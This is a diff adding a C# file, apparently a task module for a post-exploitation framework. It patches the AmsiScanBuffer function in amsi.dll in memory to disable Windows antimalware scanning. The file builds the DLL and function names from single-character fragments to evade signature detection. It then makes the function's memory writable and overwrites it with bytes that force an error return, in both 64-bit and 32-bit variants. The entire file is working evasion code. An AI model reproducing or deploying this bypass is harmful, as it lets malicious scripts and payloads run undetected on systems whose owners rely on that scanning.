@@ -1,0 +1,96 @@
+using System;
+using System.Runtime.InteropServices;
+using System.Text;
+
+public static class Task
+{
+    
+    static byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+    static byte[] x86 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
+
+    public static string Execute()
+    {
+        if (is64Bit())
+        {
+            lulukids(x64);
+            return "64 bit Successful";
+        }
+        else
+        {
+            lulukids(x86);
+            return "32 bit Successful";
+        }
+
+    }
+
+    private static string lulukidsdll
+    {
+        get
+        {
+            var sb = new StringBuilder(@"a");
+            sb.Append(@"m");
+            sb.Append(@"s");
+            sb.Append(@"i");
+            sb.Append(@".");
+            sb.Append(@"d");
+            sb.Append(@"ll");
+            return sb.ToString();
+        }
+    }
+
+    private static string lulukidsbuf
+    {
+        get
+        {
+            var sb = new StringBuilder(@"A");
+            sb.Append(@"m");
+            sb.Append(@"s");
+            sb.Append(@"i");
+            sb.Append(@"S");
+            sb.Append(@"c");
+            sb.Append(@"an");
+            sb.Append(@"B");
+            sb.Append(@"u");
+            sb.Append(@"ff");
+            sb.Append(@"e");
+            sb.Append(@"r");
+            return sb.ToString();
+        }
+    }
+    private static void lulukids(byte[] patch)
+    {
+
+        
+        var lib = Win32.LoadLibrary(lulukidsdll);
+        var addr = Win32.GetProcAddress(lib, lulukidsbuf);
+
+        uint oldProtect;
+        Win32.VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);
+
+        Marshal.Copy(patch, 0, addr, patch.Length);
+
+
+    }
+
+    private static bool is64Bit()
+    {
+        bool is64Bit = true;
+
+        if (IntPtr.Size == 4)
+            is64Bit = false;
+
+        return is64Bit;
+    }
+}
+
+class Win32
+{
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+}
